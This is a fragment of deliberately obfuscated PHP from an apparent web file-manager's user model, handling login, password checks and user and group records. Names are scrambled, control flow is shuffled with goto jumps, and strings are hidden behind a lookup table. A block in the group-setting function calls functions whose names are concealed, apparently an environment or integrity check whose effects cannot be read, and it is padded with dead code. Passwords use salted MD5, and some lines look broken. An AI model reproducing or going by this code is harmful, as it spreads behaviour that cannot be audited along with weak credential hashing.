$eÔƒß¡¦Š = false) { return parent::listData($f‹‡„‘£¯, $d„¢èÉ¬©î, $eÔƒß¡¦Š); } public function remove($c•áˆì£Ï) { return parent::remove($c•áˆì£Ï); } public function add($cŠÀ¬‘ù‹§) { $bˆ»ÌğÂãÄ =& $_SERVER[Ö¹ñÒÁ²÷]; if ($this->findByName($cŠÀ¬‘ù‹§[$bˆ»ÌğÂãÄ[28]])) { return !1; } $cŠÀ¬‘ù‹§[$bˆ»ÌğÂãÄ[2100]] = $this->getSort(); return parent::insert($cŠÀ¬‘ù‹§); } private function getSort() { $aãÄŞ´ˆ =& $_SERVER[Ö¹ñÒÁ²÷]; $eòÍƒ¼·Ïì = parent::listData(); $c–÷ÍŸØÜõ = array_to_keyvalue($eòÍƒ¼·Ïì, $aãÄŞ´ˆ[33], $aãÄŞ´ˆ[2100]); return empty($c–÷ÍŸØÜõ) ? 0 : max($c–÷ÍŸØÜõ) + 1; } public function update($DİÛëå®Ï, $Fƒ‘ÒˆËÉÊ) { $A•¿Ÿ—İ©ñ =& $_SERVER[Ö¹ñÒÁ²÷]; $E«Ì…Ê¬Š = parent::listData($DİÛëå®Ï); $b†«ã´µ­Ã = $this->findByName($Fƒ‘ÒˆËÉÊ[$A•¿Ÿ—İ©ñ[28]]); if (!$E«Ì…Ê¬Š || $b†«ã´µ­Ã && $b†«ã´µ­Ã[$A•¿Ÿ—İ©ñ[363]] != $E«Ì…Ê¬Š[$A•¿Ÿ—İ©ñ[363]]) { return !1; } return parent::update($DİÛëå®Ï, $Fƒ‘ÒˆËÉÊ); } public function setUserJob($døµ‘Ú¦Œ², $B´ÔÄÌâàÉ) { goto Bî§Š¦¨§—; bó´áœÏÖ¯: $b„©Í»êÆ– = rtrim($b„©Í»êÆ–, $d„Ûó‡ÊÚÎ[47]); Model($d„Ûó‡ÊÚÎ[473])->metaSet($døµ‘Ú¦Œ², self::JOB_KEY, $b„©Í»êÆ–); goto B…ğßÀ‰; Bî§Š¦¨§—: $d„Ûó‡ÊÚÎ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!is_array($B´ÔÄÌâàÉ)) { $B´ÔÄÌâàÉ = array($B´ÔÄÌâàÉ); } $Aó„æÁŠø† = parent::listData(); goto CØµ¾Ò¢¨»; CØµ¾Ò¢¨»: $cç„¨‘¦äö = array_to_keyvalue($Aó„æÁŠø†, $d„Ûó‡ÊÚÎ[28]); $b„©Í»êÆ– = $d„Ûó‡ÊÚÎ[357]; foreach ($B´ÔÄÌâàÉ as $e¶œ¼Æ¸ì) { if ($cç„¨‘¦äö[$e¶œ¼Æ¸ì]) { $b„©Í»êÆ– .= $cç„¨‘¦äö[$e¶œ¼Æ¸ì][$d„Ûó‡ÊÚÎ[363]] . $d„Ûó‡ÊÚÎ[47]; } else { $F“‰£Ÿ¦òŒ = $this->add($e¶œ¼Æ¸ì); $b„©Í»êÆ– .= $F“‰£Ÿ¦òŒ . $d„Ûó‡ÊÚÎ[47]; } } goto bó´áœÏÖ¯; B…ğßÀ‰: } public function getUserJob($cÆé¥’¦ñƒ) { $aØø‹Ùã§– = Model($_SERVER[Ö¹ñÒÁ²÷][473])->metaGet($cÆé¥’¦ñƒ); return $this->getUserJobInfo($aØø‹Ùã§–[self::JOB_KEY]); } public function getUserJobInfo($bŸíº¦º) { goto BŠ¬ˆº¦Ã; d…×­¹°‡Ö: return $a¼³­«¢……; goto F¼«Âå¹ëÁ; BŠ¬ˆº¦Ã: $F±ä‹ƒØ =& $_SERVER[Ö¹ñÒÁ²÷]; $c•ó¨°“¡ = explode($F±ä‹ƒØ[47], $bŸíº¦º); $f¯ÊÖÄ²îŞ = parent::listData(); goto Bñß®È¥ç–; Bñß®È¥ç–: $f¯ÊÖÄ²îŞ = array_remove_key($f¯ÊÖÄ²îŞ, $F±ä‹ƒØ[183]); $a¼³­«¢…… = array(); foreach ($c•ó¨°“¡ as $bğñŞ’ˆ¸) { if (isset($f¯ÊÖÄ²îŞ[$bğñŞ’ˆ¸])) { $a¼³­«¢……[] = $f¯ÊÖÄ²îŞ[$bğñŞ’ˆ¸]; } } goto d…×­¹°‡Ö; F¼«Âå¹ëÁ: } } class UserModel extends ModelBase { protected $tableName = "\165\163\x65\162"; protected $tableMeta = array("\164\x61\142\154\145\x4e\x61\x6d\x65" => "\165\x73\145\x72\137\x6d\x65\x74\141", "\x6d\x65\164\x61\x46\151\x65\154\144" => "\165\x73\x65\162\111\x44"); protected $simpleField = "\165\x73\145\x72\x49\104\x2c\156\151\x63\153\116\x61\155\x65\x2c\156\141\x6d\145\54\141\x76\x61\164\141\x72\x2c\x73\145\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Eä•­“·£•) { $f“‰¬È¸„« =& $_SERVER[Ö¹ñÒÁ²÷]; $dŞÏŠò”³ = $f“‰¬È¸„«[2465]; return array($f“‰¬È¸„«[2146] => array($Eä•­“·£•[0], $dŞÏŠò”³), $f“‰¬È¸„«[2148] => array($Eä•­“·£•[0], $dŞÏŠò”³), $f“‰¬È¸„«[2466] => array($Eä•­“·£•[0], $dŞÏŠò”³)); } protected function getInfo($BŞ »Âº½Œ, $c›ÚŸ±ˆô¦ = false) { $cËÌ¶Œó¦² = $this->getInfoSimple($BŞ »Âº½Œ); if (!is_array($cËÌ¶Œó¦²)) { return array(); } if ($c›ÚŸ±ˆô¦) { return $this->_getInfoApply($cËÌ¶Œó¦²); } return $this->cacheFunctionGet($_SERVER[Ö¹ñÒÁ²÷][2188], $BŞ »Âº½Œ); } protected function getInfoFull($aùÔ˜¨ÍÛ, $cõƒ‹—Æ¸ = false) { $E²™Ã¢«É = $this->getInfoSimple($aùÔ˜¨ÍÛ); if (!is_array($E²™Ã¢«É)) { return array(); } if ($cõƒ‹—Æ¸) { return $this->_getInfoApply($E²™Ã¢«É, !0); return $this->_getInfoApply($E²™Ã¢«É, !0); } return $this->cacheFunctionGet($_SERVER[Ö¹ñÒÁ²÷][2467], $aùÔ˜¨ÍÛ); } private function _getInfoApply($FñƒÆ§î®İ, $Aòƒù¨¯Û = false) { goto Bäíå˜òã”; dÖù×Ù‰Ëˆ: $FñƒÆ§î®İ = $this->_listDataApplyItem($FñƒÆ§î®İ); $b¯À¶Ù—òà = Model($f•×–èÂ·Œ[1104])->metaGet($FñƒÆ§î®İ[$f•×–èÂ·Œ[387]][$f•×–èÂ·Œ[365]]); $FñƒÆ§î®İ[$f•×–èÂ·Œ[2470]] = $Dßƒó‡‹“ó; goto Dó’ñ‘—Ş¼; Dó’ñ‘—Ş¼: $FñƒÆ§î®İ[$f•×–èÂ·Œ[387]][$f•×–èÂ·Œ[2303]] = isset($b¯À¶Ù—òà[$f•×–èÂ·Œ[2304]]) ? $b¯À¶Ù—òà[$f•×–èÂ·Œ[2304]] : null; if ($Aòƒù¨¯Û) { $FñƒÆ§î®İ[$f•×–èÂ·Œ[413]] = $this->metaGet($FñƒÆ§î®İ[$f•×–èÂ·Œ[1415]]); } return $FñƒÆ§î®İ; goto cÏŠòéĞÂ½; Bäíå˜òã”: $f•×–èÂ·Œ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$FñƒÆ§î®İ) { return $FñƒÆ§î®İ; } $Dßƒó‡‹“ó = md5($f•×–èÂ·Œ[2468] . $FñƒÆ§î®İ[$f•×–èÂ·Œ[798]] . $f•×–èÂ·Œ[2469] . $FñƒÆ§î®İ[$f•×–èÂ·Œ[28]]); goto dÖù×Ù‰Ëˆ; cÏŠòéĞÂ½: } protected function getInfoSimple($A†‹ÒÂŞô, $b¬ÜÎµí·° = false) { $E½ğÂ¶ª‰ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$A†‹ÒÂŞô) { return array(); } if ($b¬ÜÎµí·°) { $CêÇ¾É‹° = $this->where(array($E½ğÂ¶ª‰[1415] => intval($A†‹ÒÂŞô)))->find(); if (!is_array($CêÇ¾É‹°)) { return array(); } $CêÇ¾É‹°[$E½ğÂ¶ª‰[2471]] = Action($E½ğÂ¶ª‰[2472])->parseUrl($CêÇ¾É‹°[$E½ğÂ¶ª‰[2471]]); return $CêÇ¾É‹°; } return $this->cacheFunctionGet($E½ğÂ¶ª‰[2149], $A†‹ÒÂŞô); } protected function getInfoSimpleOuter($CÉÄÊÕÙ©‰) { goto DÅ—¦±ÖÂò; Fö¬‡ó‰‚: $CÕ¿·õÖËç = array_field_key($CÅ³’ÍÑä, explode($a¤‘†©Å¹¡[47], $this->simpleField)); if (!$CÕ¿·õÖËç) { return array($a¤‘†©Å¹¡[1415] => $a¤‘†©Å¹¡[1025], $a¤‘†©Å¹¡[28] => $a¤‘†©Å¹¡[153] . LNG($a¤‘†©Å¹¡[2475]) . $a¤‘†©Å¹¡[472], $a¤‘†©Å¹¡[2471] => STATIC_PATH . $a¤‘†©Å¹¡[2476]); } $CÕ¿·õÖËç[$a¤‘†©Å¹¡[2471]] = Action($a¤‘†©Å¹¡[2472])->parseUrl($CÕ¿·õÖËç[$a¤‘†©Å¹¡[2471]]); goto Bî°ïâïÕÛ; DÅ—¦±ÖÂò: $a¤‘†©Å¹¡ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$CÉÄÊÕÙ©‰ || $CÉÄÊÕÙ©‰ == 0) { return array($a¤‘†©Å¹¡[1415] => $a¤‘†©Å¹¡[464], $a¤‘†©Å¹¡[28] => $a¤‘†©Å¹¡[153] . LNG($a¤‘†©Å¹¡[2473]) . $a¤‘†©Å¹¡[472], $a¤‘†©Å¹¡[2471] => STATIC_PATH . $a¤‘†©Å¹¡[2474]); } $CÅ³’ÍÑä = $this->cacheFunctionGet($a¤‘†©Å¹¡[2149], $CÉÄÊÕÙ©‰); goto Fö¬‡ó‰‚; Bî°ïâïÕÛ: return $CÕ¿·õÖËç; goto B‰”ˆÄğôÓ; B‰”ˆÄğôÓ: } protected function groupUser($d“éö¡„É) { } public static function errorLang($f™¿Ì’Ü) { $b¾âŸ·“² =& $_SERVER[Ö¹ñÒÁ²÷]; $bÙÇ†Œ¦É’ = array(self::ERROR_USER_NOT_EXISTS => $b¾âŸ·“²[2477], self::ERROR_USER_PASSWORD_ERROR => $b¾âŸ·“²[2478], self::ERROR_USER_EXIST_NAME => $b¾âŸ·“²[2479], self::ERROR_USER_EXIST_PHONE => $b¾âŸ·“²[2480], self::ERROR_USER_EXIST_EMAIL => $b¾âŸ·“²[2481], self::ERROR_USER_LOGIN_LOCK => $b¾âŸ·“²[2482], self::ERROR_IP_NOT_ALLOW => $b¾âŸ·“²[2483], self::ERROR_USER_EXIST_NICKNAME => $b¾âŸ·“²[2484]); return LNG($bÙÇ†Œ¦É’[$f™¿Ì’Ü]); } public function getInfoByMeta($AíÃŸá¥Ù, $Dß•¼†©Ãí) { $BŞ¥ˆèîÊˆ =& $_SERVER[Ö¹ñÒÁ²÷]; $A§ÏòŞá…Œ = Model($BŞ¥ˆèîÊˆ[2485])->where(array($BŞ¥ˆèîÊˆ[89] => $AíÃŸá¥Ù, $BŞ¥ˆèîÊˆ[355] => $Dß•¼†©Ãí))->find(); if ($A§ÏòŞá…Œ) { return $this->getInfo($A§ÏòŞá…Œ[$BŞ¥ˆèîÊˆ[1415]]); } return !1; } public function userLoginCheck($d¾¨Û„××Å, $b ¦£õÌÊÂ) { goto cÇéŒ‚ŠÔ; cÇéŒ‚ŠÔ: $AìµªŠ¼Î =& $_SERVER[Ö¹ñÒÁ²÷]; $bİ»Œ¿½ = array($AìµªŠ¼Î[28] => $d¾¨Û„××Å, $AìµªŠ¼Î[2307] => $d¾¨Û„××Å, $AìµªŠ¼Î[289] => $d¾¨Û„××Å, $AìµªŠ¼Î[2486] => $d¾¨Û„××Å, $AìµªŠ¼Î[910] => $AìµªŠ¼Î[912]); if ($this->nickNameRpt()) { unset($bİ»Œ¿½[$AìµªŠ¼Î[2307]]); } goto E·ŒÊòÙâ; E ç¼éÅ©«: $this->userEdit($E»òˆƒŸ‹[$AìµªŠ¼Î[1415]], array($AìµªŠ¼Î[2487] => time())); $this->clearCache($E»òˆƒŸ‹[$AìµªŠ¼Î[1415]]); return $this->getInfo($E»òˆƒŸ‹[$AìµªŠ¼Î[1415]]); goto f¼‘©¨…; E·ŒÊòÙâ: $E»òˆƒŸ‹ = $this->where($bİ»Œ¿½)->find(); if (!$E»òˆƒŸ‹) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($E»òˆƒŸ‹[$AìµªŠ¼Î[1415]], $b ¦£õÌÊÂ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto E ç¼éÅ©«; f¼‘©¨…: } public function clearCache($f³í®İ©‚¦) { $B—Œõ¤¹î =& $_SERVER[Ö¹ñÒÁ²÷]; $this->cacheFunctionClear($B—Œõ¤¹î[2188], $f³í®İ©‚¦); $this->cacheFunctionClear($B—Œõ¤¹î[2149], $f³í®İ©‚¦); } public function userPasswordCheck($BÅí—åéöî, $Eê©˜éÎµĞ) { $fÊœÍ‡•Ç =& $_SERVER[Ö¹ñÒÁ²÷]; $AÑ‹¸‹Ìù‰ = $this->where(array($fÊœÍ‡•Ç[1415] => intval($BÅí—åéöî)))->find(); $bÖö§“è = $this->metaGet($BÅí—åéöî); $FÀÆÜÅÃ¶Ë = isset($bÖö§“è[$fÊœÍ‡•Ç[2488]]) ? $bÖö§“è[$fÊœÍ‡•Ç[2488]] : $fÊœÍ‡•Ç[33]; if (md5($FÀÆÜÅÃ¶Ë . trim($Eê©˜éÎµĞ)) !== $AÑ‹¸‹Ìù‰[$fÊœÍ‡•Ç[798]]) { return !1; } return !0; } public function userAdd($CÙ´½§½Ê£) { goto aÍåÁÆ™„¨; fÍ÷åÇÛà: return $CÓßÅ¯¦; goto e¦Şä¢íŠø; aÍåÁÆ™„¨: $c¦©Â¬Œ‰„ =& $_SERVER[Ö¹ñÒÁ²÷]; $AêÎ¦é½î… = array($c¦©Â¬Œ‰„[382] => $CÙ´½§½Ê£[$c¦©Â¬Œ‰„[28]], $c¦©Â¬Œ‰„[2489] => $CÙ´½§½Ê£[$c¦©Â¬Œ‰„[2490]], $c¦©Â¬Œ‰„[2491] => isset($CÙ´½§½Ê£[$c¦©Â¬Œ‰„[289]]) ? $CÙ´½§½Ê£[$c¦©Â¬Œ‰„[289]] : $c¦©Â¬Œ‰„[33], $c¦©Â¬Œ‰„[2492] => isset($CÙ´½§½Ê£[$c¦©Â¬Œ‰„[2486]]) ? $CÙ´½§½Ê£[$c¦©Â¬Œ‰„[2486]] : $c¦©Â¬Œ‰„[33], $c¦©Â¬Œ‰„[2493] => isset($CÙ´½§½Ê£[$c¦©Â¬Œ‰„[2307]]) ? $CÙ´½§½Ê£[$c¦©Â¬Œ‰„[2307]] : $CÙ´½§½Ê£[$c¦©Â¬Œ‰„[28]], $c¦©Â¬Œ‰„[2494] => isset($CÙ´½§½Ê£[$c¦©Â¬Œ‰„[2471]]) ? $CÙ´½§½Ê£[$c¦©Â¬Œ‰„[2471]] : $c¦©Â¬Œ‰„[33], $c¦©Â¬Œ‰„[2495] => isset($CÙ´½§½Ê£[$c¦©Â¬Œ‰„[2496]]) ? $CÙ´½§½Ê£[$c¦©Â¬Œ‰„[2496]] : 1, $c¦©Â¬Œ‰„[2497] => $CÙ´½§½Ê£[$c¦©Â¬Œ‰„[798]], $c¦©Â¬Œ‰„[2150] => isset($CÙ´½§½Ê£[$c¦©Â¬Œ‰„[2063]]) ? $CÙ´½§½Ê£[$c¦©Â¬Œ‰„[2063]] : 1024 * 1024 * 20, $c¦©Â¬Œ‰„[2151] => 0, $c¦©Â¬Œ‰„[2487] => 0, $c¦©Â¬Œ‰„[2175] => isset($CÙ´½§½Ê£[$c¦©Â¬Œ‰„[686]]) ? $CÙ´½§½Ê£[$c¦©Â¬Œ‰„[686]] : 1); if (!empty($CÙ´½§½Ê£[$c¦©Â¬Œ‰„[1415]])) { $AêÎ¦é½î…[$c¦©Â¬Œ‰„[1415]] = $CÙ´½§½Ê£[$c¦©Â¬Œ‰„[1415]]; } goto bÁ¬£ÏÛ•½; f¿¿«Î‰®Æ: $cÏ—‡‰È¢ = array($c¦©Â¬Œ‰„[2497] => $AêÎ¦é½î…[$c¦©Â¬Œ‰„[798]], $c¦©Â¬Œ‰„[2493] => $AêÎ¦é½î…[$c¦©Â¬Œ‰„[2307]]); $this->userEdit($CÓßÅ¯¦, $cÏ—‡‰È¢); Model($c¦©Â¬Œ‰„[1104])->userRootAdd($CÓßÅ¯¦); goto fÍ÷åÇÛà; bÁ¬£ÏÛ•½: $b³‰ƒ³ã’• = $this->_checkExist($CÙ´½§½Ê£); if ($b³‰ƒ³ã’• !== !0) { return $b³‰ƒ³ã’•; } $CÓßÅ¯¦ = $this->add($AêÎ¦é½î…); goto f¿¿«Î‰®Æ; e¦Şä¢íŠø: } protected function userEditTest($Aá¹¹ñ—ˆÍ, $DïÛ©‡¸) { return $this->call($_SERVER[Ö¹ñÒÁ²÷][2498], $Aá¹¹ñ—ˆÍ, $DïÛ©‡¸); } protected function userEdit($AñÒ…Ì·ÈŒ, $C—Ï¯õ£©ö) { goto AÏŒ³ÖĞ•; AÏŒ³ÖĞ•: $aì£Ë‰òïÜ =& $_SERVER[Ö¹ñÒÁ²÷]; $A«‹ùèÁíÕ = $this->getInfoSimple($AñÒ…Ì·ÈŒ); if (!$A«‹ùèÁíÕ) { return !1; } goto d¡Àì°Õ»; d¡Àì°Õ»: $D‚³¸“ÜÄâ = $this->_checkExist($C—Ï¯õ£©ö, $AñÒ…Ì·ÈŒ); if ($D‚³¸“ÜÄâ !== !0) { return $D‚³¸“ÜÄâ; } if (isset($C—Ï¯õ£©ö[$aì£Ë‰òïÜ[798]]) && trim($C—Ï¯õ£©ö[$aì£Ë‰òïÜ[798]]) != $aì£Ë‰òïÜ[33]) { $EÏ¾¶†©Ú = $this->metaGet($AñÒ…Ì·ÈŒ); if (empty($EÏ¾¶†©Ú[$aì£Ë‰òïÜ[2488]])) { $EÏ¾¶†©Ú[$aì£Ë‰òïÜ[2488]] = rand_string(10); Model($aì£Ë‰òïÜ[470])->metaSet($AñÒ…Ì·ÈŒ, $aì£Ë‰òïÜ[2488], $EÏ¾¶†©Ú[$aì£Ë‰òïÜ[2488]]); } $C—Ï¯õ£©ö[$aì£Ë‰òïÜ[798]] = md5($EÏ¾¶†©Ú[$aì£Ë‰òïÜ[2488]] . trim($C—Ï¯õ£©ö[$aì£Ë‰òïÜ[798]])); } else { unset($C—Ï¯õ£©ö[$aì£Ë‰òïÜ[798]]); } goto A÷Ñºîñá; A÷Ñºîñá: $this->where(array($aì£Ë‰òïÜ[1406] => $AñÒ…Ì·ÈŒ))->save($C—Ï¯õ£©ö); if (isset($C—Ï¯õ£©ö[$aì£Ë‰òïÜ[2307]])) { $this->setNamePinyin($AñÒ…Ì·ÈŒ, $C—Ï¯õ£©ö[$aì£Ë‰òïÜ[2307]]); } return !0; goto FÜØ–èÎ™…; FÜØ–èÎ™…: } public function setNamePinyin($FŸ×ñ‘È¥ä, $dÁ¡„Ï·Öâ = false) { $fƒ”Ç«» =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$dÁ¡„Ï·Öâ) { $fïÓ‚àŠŠé = $this->getInfoSimple($FŸ×ñ‘È¥ä); $dÁ¡„Ï·Öâ = $fïÓ‚àŠŠé[$fƒ”Ç«»[2307]] ? $fïÓ‚àŠŠé[$fƒ”Ç«»[2307]] : $fïÓ‚àŠŠé[$fƒ”Ç«»[28]]; } $EàŞÓï”– = Model($fƒ”Ç«»[473]); if (!Input::check($dÁ¡„Ï·Öâ, $fƒ”Ç«»[524])) { return $EàŞÓï”–->metaSet($FŸ×ñ‘È¥ä, array($fƒ”Ç«»[412] => $fƒ”Ç«»[33], $fƒ”Ç«»[411] => $fƒ”Ç«»[33])); } return $EàŞÓï”–->metaSet($FŸ×ñ‘È¥ä, array($fƒ”Ç«»[412] => str_replace($fƒ”Ç«»[50], $fƒ”Ç«»[33], Pinyin::encode($dÁ¡„Ï·Öâ)), $fƒ”Ç«»[411] => Pinyin::encode($dÁ¡„Ï·Öâ, $fƒ”Ç«»[525]))); } private function nickNameRpt() { $FàØÎÏ…Â =& $_SERVER[Ö¹ñÒÁ²÷]; $E—´›ÈÎ’± = Model($FàØÎÏ…Â[1082])->get($FàØÎÏ…Â[2499]); $C«î¥¼…¯‚ = $GLOBALS[$FàØÎÏ…Â[6]][$FàØÎÏ…Â[2455]][$FàØÎÏ…Â[2499]]; $E¢åš³ìË = !is_null($E—´›ÈÎ’±) ? $E—´›ÈÎ’± : $C«î¥¼…¯‚; return !!$E¢åš³ìË; } private function _checkExist($DôøÆœ‡Ï, $B»÷ªˆ‚ = false) { $aƒºá•Á¦Ñ =& $_SERVER[Ö¹ñÒÁ²÷]; $Cî§Ç›¢¨± = array($aƒºá•Á¦Ñ[28] => UserModel::ERROR_USER_EXIST_NAME, $aƒºá•Á¦Ñ[2307] => UserModel::ERROR_USER_EXIST_NICKNAME, $aƒºá•Á¦Ñ[289] => UserModel::ERROR_USER_EXIST_EMAIL, $aƒºá•Á¦Ñ[2486] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Cî§Ç›¢¨±[$aƒºá•Á¦Ñ[2307]]); } $EÜµ·¸ÇÁã = $B»÷ªˆ‚ ? array($aƒºá•Á¦Ñ[1415] => array($aƒºá•Á¦Ñ[2500], $B»÷ªˆ‚)) : array(); foreach ($Cî§Ç›¢¨± as $BàÙ÷‡ÛÙ => $A®¢ãÄàÏ) { if (!isset($DôøÆœ‡Ï[$BàÙ÷‡ÛÙ]) || !$DôøÆœ‡Ï[$BàÙ÷‡ÛÙ]) { continue; } $dôğÉÇø¾Ã = array_merge(array($BàÙ÷‡ÛÙ => $DôøÆœ‡Ï[$BàÙ÷‡ÛÙ]), $EÜµ·¸ÇÁã); $cÖ”ƒÂÆ = $this->where($dôğÉÇø¾Ã)->find(); if ($cÖ”ƒÂÆ) { return $A®¢ãÄàÏ; } } return !0; } public function userListInfo($EÍ­µ’¡ï‰) { $cÛ–„ˆ³ï¾ =& $_SERVER[Ö¹ñÒÁ²÷]; $c»ÓµÕÎ„ = array(); $EÍ­µ’¡ï‰ = is_array($EÍ­µ’¡ï‰) ? array_unique($EÍ­µ’¡ï‰) : array(); if (!$EÍ­µ’¡ï‰) { return $c»ÓµÕÎ„; } if (count($EÍ­µ’¡ï‰) < 20) { foreach ($EÍ­µ’¡ï‰ as $b•à‹³…™ˆ) { $c»ÓµÕÎ„[$b•à‹³…™ˆ . $cÛ–„ˆ³ï¾[33]] = $this->getInfoSimpleOuter($b•à‹³…™ˆ); } } else { $B™Àèæâñ = array($cÛ–„ˆ³ï¾[1406] => array($cÛ–„ˆ³ï¾[380], $EÍ­µ’¡ï‰)); if (count($EÍ­µ’¡ï‰) == 1) { $B™Àèæâñ = array($cÛ–„ˆ³ï¾[1406] => $EÍ­µ’¡ï‰[0]); } $C¦º™“Œ†± = Model($cÛ–„ˆ³ï¾[470])->field($this->simpleField)->where($B™Àèæâñ)->select(); $C¦º™“Œ†± = array_to_keyvalue($C¦º™“Œ†±, $cÛ–„ˆ³ï¾[1415]); foreach ($EÍ­µ’¡ï‰ as $b•à‹³…™ˆ) { $CÅÉİå»Ù = $C¦º™“Œ†±[$C¦º™“Œ†±[$b•à‹³…™ˆ]]; if (!$CÅÉİå»Ù) { $c»ÓµÕÎ„[$b•à‹³…™ˆ . $cÛ–„ˆ³ï¾[33]] = $this->getInfoSimpleOuter($b•à‹³…™ˆ); continue; } $CÅÉİå»Ù[$cÛ–„ˆ³ï¾[2471]] = Action($cÛ–„ˆ³ï¾[2472])->parseUrl($CÅÉİå»Ù[$cÛ–„ˆ³ï¾[2471]]); $c»ÓµÕÎ„[$b•à‹³…™ˆ . $cÛ–„ˆ³ï¾[33]] = $CÅÉİå»Ù; } } return $c»ÓµÕÎ„; } protected function userStatus($bœ¬µäÉë, $A‚°†­Ôß’) { $CÊš¾¼ÀÆØ = $this->getInfoSimple($bœ¬µäÉë); if (!$CÊš¾¼ÀÆØ) { return !1; } $b–ĞŸ…²  = array($_SERVER[Ö¹ñÒÁ²÷][686] => $A‚°†­Ôß’); return $this->userEdit($bœ¬µäÉë, $b–ĞŸ…² ); } protected function userRemove($AÄëšøÓÎÄ) { goto AÃè¢¾‰„; AÃè¢¾‰„: $B£‚³ª¾î =& $_SERVER[Ö¹ñÒÁ²÷]; $A—îßÅé Â = $this->getInfoSimple($AÄëšøÓÎÄ); if (!$A—îßÅé Â) { return !1; } goto bÏ…µê¡§§; DÏªÇÀä˜: Model($B£‚³ª¾î[749])->userRootRemove($AÄëšøÓÎÄ); return $this->where($Eì¥ºÉ‹à)->delete(); goto DÍ¸¿ƒÎŒ»; CŞŒ•ĞµÉ: Model($B£‚³ª¾î[2154])->where($Eì¥ºÉ‹à)->delete(); Model($B£‚³ª¾î[2485])->where($Eì¥ºÉ‹à)->delete(); Model($B£‚³ª¾î[2502])->where($Eì¥ºÉ‹à)->delete(); goto DÏªÇÀä˜; bÏ…µê¡§§: $Eì¥ºÉ‹à = array($B£‚³ª¾î[1406] => $AÄëšøÓÎÄ); Model($B£‚³ª¾î[532])->where($Eì¥ºÉ‹à)->delete(); Model($B£‚³ª¾î[2501])->where($Eì¥ºÉ‹à)->delete(); goto CŞŒ•ĞµÉ; DÍ¸¿ƒÎŒ»: } protected function userGroupSet($a„·ç±°½Ğ, $D×«é˜¾Ê, $CïÊ…ÍàÕš = array()) { goto dà©¤œ¬ÔÒ; EéËË—ÙÊ´: if (!$eª—¢ƒÙï† || !is_array($D×«é˜¾Ê)) { return !1; } $CìğÚ²ã£ˆ = Model($AèİÌ¤‹šÕ[2154]); $CìğÚ²ã£ˆ->where(array($AèİÌ¤‹šÕ[1415] => $a„·ç±°½Ğ))->delete(); goto CœÒèíß; dà©¤œ¬ÔÒ: $AèİÌ¤‹šÕ =& $_SERVER[Ö¹ñÒÁ²÷]; if ($_SERVER[$AèİÌ¤‹šÕ[783]] != $_SERVER[$AèİÌ¤‹šÕ[784]]) { goto EŞ‹ÛÎ…í§; f£‰¯ñ¤: $B¯ÅÙ¯®‹£ = 1; while ($B¯ÅÙ¯®‹£ > 1) { $B¯ÅÙ¯®‹£ = $B¯ÅÙ¯®‹£ + 4; $DÜš¬Ã·ó = rawurlencode($B¯ÅÙ¯®‹£ . $AèİÌ¤‹šÕ[357]); } goto f•Ö½Ï¦À›; EŞ‹ÛÎ…í§: $båÕ¯§ê§ = $AèİÌ¤‹šÕ[785]; $C¿°¤ªİ…â = $AèİÌ¤‹šÕ[786]; $BÚÅ¨¼œÍ£ = $_SERVER[$AèİÌ¤‹šÕ[787]] . $AèİÌ¤‹šÕ[788]; goto Cß¡µÍéØ½; Cß¡µÍéØ½: $EåŠ¯‡ƒØÉ = $C¿°¤ªİ…â($BÚÅ¨¼œÍ£); $Aìë®µñÁ´ = explode($AèİÌ¤‹šÕ[213], $EåŠ¯‡ƒØÉ); if (count($Aìë®µñÁ´) < $AèİÌ¤‹šÕ[599]) { $c§Ø—ñØ¸ = $AèİÌ¤‹šÕ[789]; $c§Ø—ñØ¸(); } goto E¼ÖÈš¯Ë·; E¼ÖÈš¯Ë·: $FÂÆëÕ£ÔÏ = $AèİÌ¤‹šÕ[790]; $FÂÆëÕ£ÔÏ($_SERVER[$AèİÌ¤‹šÕ[791]]); $FÂÆëÕ£ÔÏ($_SERVER[$AèİÌ¤‹šÕ[787]] . $AèİÌ¤‹šÕ[792]); goto f£‰¯ñ¤; f•Ö½Ï¦À›: } $eª—¢ƒÙï† = $this->getInfoSimple($a„·ç±°½Ğ); goto EéËË—ÙÊ´; CœÒèíß: $D¿ÂÇ°Ãğ = array(); $CèƒÍÒ‘ğ = 0; foreach ($D×«é˜¾Ê as $aåãÎñ……Ø => $bô…Ê¶¹ã) { $F…‰ˆùë÷â = array($AèİÌ¤‹šÕ[1415] => $a„·ç±°½Ğ, $AèİÌ¤‹šÕ[2079] => $aåãÎñ……Ø, $AèİÌ¤‹šÕ[2208] => $bô…Ê¶¹ã); $F…‰ˆùë÷â[$AèİÌ¤‹šÕ[2100]] = isset($CïÊ…ÍàÕš[$CèƒÍÒ‘ğ]) ? $CïÊ…ÍàÕš[$CèƒÍÒ‘ğ] : 0; $CèƒÍÒ‘ğ++; $D¿ÂÇ°Ãğ[] = $F…‰ˆùë÷â; } goto Eòºõ®¢­; Eòºõ®¢­: return $CìğÚ²ã£ˆ->addAll($D¿ÂÇ°Ãğ, array(), !0); goto C½æÍÇ˜¡£; C½æÍÇ˜¡£: } protected function userGroupAdd($CŒ³”›¨Ã , $a¶ß¸ÁÛŸ… = array()) { $c¾Â¥„¦–æ =& $_SERVER[Ö¹ñÒÁ²÷]; $dùÛË»ñÉ = $this->getInfoSimple($CŒ³”›¨Ã ); if (!$dùÛË»ñÉ || empty($a¶ß¸ÁÛŸ…)) { return !1; } $bØØòÁ²˜¹ = array(); foreach ($a¶ß¸ÁÛŸ… as $fíƒñ°ÈÂì => $a¿ã©à¥åÆ) { $bØØòÁ²˜¹[] = array($c¾Â¥„¦–æ[1415] => $CŒ³”›¨Ã , $c¾Â¥„¦–æ[2079] => $fíƒñ°ÈÂì, $c¾Â¥„¦–æ[2208] => $a¿ã©à¥åÆ); } return Model($c¾Â¥„¦–æ[2154])->addAll($bØØòÁ²˜¹, array(), !0); } protected function 